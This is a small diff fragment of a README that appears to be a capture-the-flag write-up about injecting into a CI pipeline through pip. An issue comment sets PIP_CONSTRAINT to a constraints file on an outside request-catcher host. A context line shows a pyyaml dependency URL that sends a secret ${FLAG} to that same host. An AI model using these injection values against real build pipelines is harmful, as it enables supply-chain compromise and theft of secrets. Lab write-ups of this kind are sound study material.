@@ -123,7 +123,7 @@ Response body: pyyaml@https://tdf123456.free.beeceptor.com/${FLAG}%
 Issue Comment:
 ``` bash
 Not a release :(
-PIP_CONSTRAINT=https://tdf123456.free.beeceptor.com/get-flag
+PIP_CONSTRAINT=https://tdf123456.free.beeceptor.com/constraint.txt
 ```
 <p align="right">(<a href="#readme-top">back to top</a>)</p>
 
